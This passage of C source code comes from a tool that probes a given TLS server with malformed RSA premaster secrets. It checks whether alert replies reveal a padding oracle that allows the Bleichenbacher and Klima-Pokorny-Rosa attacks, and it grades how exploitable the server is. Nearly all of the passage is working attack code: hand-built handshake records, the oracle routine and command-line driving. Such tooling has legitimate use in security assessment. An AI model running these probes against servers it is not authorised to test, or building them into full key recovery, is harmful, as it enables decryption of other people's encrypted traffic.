  if (send(sock, pkt, clen, 0) != clen)
#else
  if (write(sock, pkt, clen) != clen)
#endif
    {
      perror("write(key exchange)");
      return -1;
    }

  /* change cipher */
  
  rec->msg_type = 20; /* CHANGE CIPHER */
  rec->version = htons(0x0301); /* TLS */
  rec->length = htons(1);
  
  ptr = (unsigned char*)&rec[1];
  *ptr = 1;
  
  clen = sizeof(*rec) + 1;

#ifdef WIN32
  if (send(sock, pkt, clen, 0) != clen)
#else
  if (write(sock, pkt, clen) != clen)
#endif
    {
      if (premature_close)
	/* server sent an error message and closed the connection */
	return 0;

      perror("write(change cipher)");
      return -1;
    }

  if (debug)
	  puts("premaster sent");

  /* generate signed hash */

  generate_master_key(client_secret, server_secret, premaster+pad_length, len);
  generate_key_block(client_secret, server_secret, &suites[cipher_no], &a);
  
  rec->msg_type = 22; /* handshake */
  rec->version = htons(0x0301); /* TLS */
  
  hs->handshake_type = 20; /* client finished */
  hs->length[0] = 0x00, hs->length[1] = 0x00, hs->length[2] = 0xC;
  
  ptr = (unsigned char*)&hs[1];
  final_mesg_hash("client finished", ptr);
  
  if (debug)
    {
      for(i=0;i<12;i++)
	printf("%s%02x%c", i ? "" : "verify hash: ", 
	       ptr[i] & 0xff, (i==11) ? '\n' : ' ');
    }
  
  clen = sizeof(*hs) + 12;
  hash_message(rec->msg_type, (unsigned char*)hs, clen,
	       a.client.hash_secret, a.hash);
  
  clen = encrypt_message((unsigned char*)hs, clen + EVP_MD_size(a.hash),
			 &a.client.cipher_ctx);
  
  rec->length = htons((unsigned short)clen);
  clen += sizeof(*rec);

#ifdef WIN32
  if (send(sock, pkt, clen,0) != clen)
#else
  if (write(sock, pkt, clen) != clen)
#endif
    {
      if (premature_close)
	/* server sent an error message and closed the connection */
	return 0;

      perror("write(client finished)");
      return -1;
    }

  if (debug)
	  puts("sent client done");

  return 0;
}

void
cleanup(EVP_PKEY *rsa)
{
  if (rsa != NULL) EVP_PKEY_free(rsa);
  if (cert != NULL) { 
    X509_free(cert);
    cert = NULL;
  }
}

static int 
oracle(struct in_addr *ip, u_short port, 
       unsigned char *buf, int len, unsigned int pm_len)
{
  EVP_PKEY *rsa = NULL;
  int i, rv = 1;
  SOCKET sock;
  unsigned char reply[1024];

  sock = ssl_connection(ip, port, &rsa);
  if (sock == INVALID_SOCKET)
  {
    cleanup(rsa);
    return -1;
  }

  if (send_premaster(sock, rsa, buf, pm_len, len) < 0)
  {
    cleanup(rsa);
    return -1;
  }

  if ((i = tls_record(sock, reply, sizeof(reply), &len)) < 0)
  {
    cleanup(rsa);
    return -1;
  }
 
  if (i == 21 /* ALERT */)
    {
      /* if SSL_R_BAD_RSA_DECRYPT, succeptible to the Bleichenbacher 
       * attack.
       */
      
      struct tls_alert *a = (struct tls_alert*)reply;

      if (a->alert_details == SSL_AD_DECODE_ERROR  ||  
	  //a->alert_details == SSL_R_BAD_RSA_DECRYPT ||
	  //a->alert_details == SSL_R_BAD_PROTOCOL_VERSION_NUMBER ||
	  0)
	{
	  /* W00t! */
	  rv = 0;
	}
    }
  
#ifdef WIN32
  closesocket(sock);
#else
  close(sock);
#endif
  cleanup(rsa);
  return rv;
}

int
bleichenbacher(struct in_addr *ip, u_short port)
{
  unsigned char premaster[49], buf[1024];
  int bl_level = 0, i, len;
  EVP_PKEY *rsa = NULL;
  SOCKET sock;

  /* Get RSA key */

  if ((sock = ssl_connection(ip, port, &rsa)) == INVALID_SOCKET)
    {
      cleanup(rsa);
      return -1;
    }
#ifdef WIN32
  closesocket(sock);
#else
  close(sock);
#endif

  /* Bleichenbacher level 1: Non-PKCS compliance, wrong length, or bad version
   * 			     flagged.
   * Bleichenbacher level 2: Non-PKCS compliance, or wrong length flagged.
   * Bleichenbacher level 3: Non-PKCS compliance flagged only.
   */

  for(i=0; i<sizeof(premaster);i++)
    premaster[i] = rand() & 0xff;
 
  premaster[0] = 0x03;
  premaster[1] = 0x01;

  len = pkcs1_padding(premaster, 48, buf, rsa);
  if (len < 0)
  { 
	cleanup(rsa);
	return -1;
  }

  /* non-PKCS#1 */

  buf[0] = 0x07;
  buf[1] = 0xed;

  if (oracle(ip, port, buf, len, 48))
    return bl_level;

  bl_level++;

  /* bad version */

  premaster[0] = 0xCA;
  premaster[1] = 0xFE;

  len = pkcs1_padding(premaster, 48, buf, rsa);
  if (len < 0)
  { 
	cleanup(rsa);
	return -1;
  }

  if (!oracle(ip, port, buf, len, 48)) 
    return bl_level;

  bl_level++;

  /* bad length */

  len = pkcs1_padding(premaster, 49, buf, rsa);
  if (len < 0)
  { 
	cleanup(rsa);
	return -1;
  }

  if (oracle(ip, port, buf, len, 48))
    bl_level++;
  
  cleanup(rsa);
  return bl_level;
}
  

int
klima_pokorny_rosa(struct in_addr *ip, u_short port)
{
  EVP_PKEY *rsa = NULL;
  unsigned char premaster[48];
  unsigned char buf[1024];
  int i, len, rv;
  SOCKET sock;

  /* Get RSA key */
  if ((sock = ssl_connection(ip, port, &rsa)) == INVALID_SOCKET)
    {
      cleanup(rsa);
      return -1;
    }
#ifdef WIN32
  closesocket(sock);
#else
  close(sock);
#endif

  /* For an SSL server to be open to the KRP attack, it must _only_ return
   * a decode error when the version number is wrong (ie it must remain
   * silent for non-PKCS#1-compliant secrets, as well as secrets that are
   * too short/long).
   */

  for(i=0; i<sizeof(premaster);i++)
    premaster[i] = rand() & 0xff;

  /* Ensure that it remains silent when it should... */

  premaster[0] = 0x03;
  premaster[1] = 0x01;

  len = pkcs1_padding(premaster, sizeof(premaster), buf, rsa);
  if (len < 0)
  { 
	cleanup(rsa);
	return -1;
  }

  buf[0] = 0x07;
  buf[1] = 0xed;

  if (!oracle(ip, port, buf, len, sizeof(premaster)))
    {
      /* Nope. Server is open to bleichenbacher, which means it's
       * not susceptible to KPR.
       */
      cleanup(rsa);
      return 1;
    }

  premaster[0] = 0x02;
  premaster[1] = 0x00;

  len = pkcs1_padding(premaster, sizeof(premaster), buf, rsa);
  if (len < 0)
  { 
	cleanup(rsa);
	return -1;
  }

  rv = oracle(ip, port, buf, len, sizeof(premaster));

  cleanup(rsa);
  return rv;
}

#ifdef TESTING
int
normal(struct in_addr *ip, u_short port)
{
  /* Testing only: ensure that our TLS stack is correctly implemented. */

  EVP_PKEY *rsa = NULL;
  unsigned char premaster[48];
  unsigned char buf[1024];
  int i, len;
  SOCKET sock;
  
  sock = ssl_connection(ip, port, &rsa);
  if (sock == INVALID_SOCKET)
  {
    cleanup(rsa);
    return -1;
  }
  
  for(i=0; i<sizeof(premaster);i++)
    premaster[i] = rand() & 0xff;
  
  premaster[0] = 0x03;
  premaster[1] = 0x01;
  
  len = pkcs1_padding(premaster, sizeof(premaster), buf, rsa);
  if (len < 0)
  { 
	cleanup(rsa);
	return -1;
  }
 
  if (send_premaster(sock, rsa, buf, sizeof(premaster), len) < 0)
  {
    cleanup(rsa);
    return -1;
  }

  if ((i = tls_record(sock, buf, sizeof(buf), &len)) < 0)
  {
    cleanup(rsa);
    return -1;
  }
  
  if (i != 20 /* CHANGE CIPHER */)
    {
      fprintf(stderr, "Expected server CHANGE CIPHER: got a record of type %i -- TLS stack is broken!\n", i);
      exit(1);
    }
  
#ifdef WIN32
  closesocket(sock);
#else
  close(sock);
#endif
  cleanup(rsa);
  return 0;
}
#endif

void
usage(const char *argv0)
{
  fprintf(stderr, "Usage:\n\t%s [-dbk] [-t timeout] server [port]\n", argv0);
  exit(1);
}

int
main(int argc, char **argv)
{
  u_short port;
  struct in_addr addr;
  char *premaster = NULL;
  char *b_status[] = { "Trouble running", 
		       "Impervious to",
			"Open to level 1 (good luck)", 
			"Open to level 2 (time consuming)",
			"Open to level 3 (w00t!)"  };
  char *status[] = { "Trouble running" ,
		     "Open to",
		     "Impervious to" };
  
#define DO_B 0x1
#define DO_KPR 0x2
  int rv, attacks = DO_B | DO_KPR;
  
#ifdef WIN32
  {
	  WSADATA wd;
	  if (WSAStartup(MAKEWORD(2,0), &wd))
		  perror("WSAStartup()");
  }
#endif

  ERR_load_RSA_strings();
  OpenSSL_add_all_ciphers();
  OpenSSL_add_all_digests();
  
  while(argc > 1 && *argv[1] == '-')
    {
      switch(argv[1][1])
	{
	case 'b':
	  attacks = DO_B;
	  break;
	case 'k':
	  attacks = DO_KPR;
	  break;
	case 'd':
	  debug = 1;
	  break;
	case 's':
	  smtp_tunnel = 1;
	  break;
	case 'm':
	  if (--argc < 2) 
	    usage(argv[0]);
	  argv++;
	  premaster = argv[1];
	  break;
	case 't':
	  if (--argc < 2) 
	    usage(argv[0]);
	  argv++;
	  connect_timeout = atoi(argv[1]);
	  break;	  
	}
      argc--;
      argv++;
    }
  
  if (argc < 2)
    usage(argv[0]);

#ifdef WIN32
  if ((addr.s_addr = inet_addr(argv[1])) == INADDR_NONE)
#else  
  if (!inet_aton(argv[1], &addr))
#endif
    {
	  /* Hostname */
	  struct hostent *h;

	  if ((h = gethostbyname(argv[1])) == NULL)
	  {
	      fprintf(stderr, "Bad hostname/IP '%s'\n", argv[1]);
		  exit(1);
	  }

	  memcpy(&addr.s_addr, h->h_addr_list[0], h->h_length);
    }
  
  if (argc > 2)
    port = htons((u_short)atoi(argv[2]));
  else
    port = htons(443);
  
  if (port == 0) 
    {
      fprintf(stderr, "Illegal port number 0\n");
      exit(1);
    }
  
  if (debug) 
    printf("Connecting to %s:%u\n", inet_ntoa(addr), ntohs(port));

#ifdef TESTING  
  rv = normal(&addr, port);
  printf("%s normal mode\n", status[rv+1]);
#else 
  if (attacks & DO_B)
  {
	  rv = bleichenbacher(&addr, port);
	  printf("%s Bleichenbacher attack\n", b_status[rv+1]);
  }
  if (attacks & DO_KPR)
  {
	  rv = klima_pokorny_rosa(&addr, port);
	  printf("%s Klima-Pokorny-Rosa attack\n", status[rv+1]);
  }
#endif
 
  exit(0);
}
 
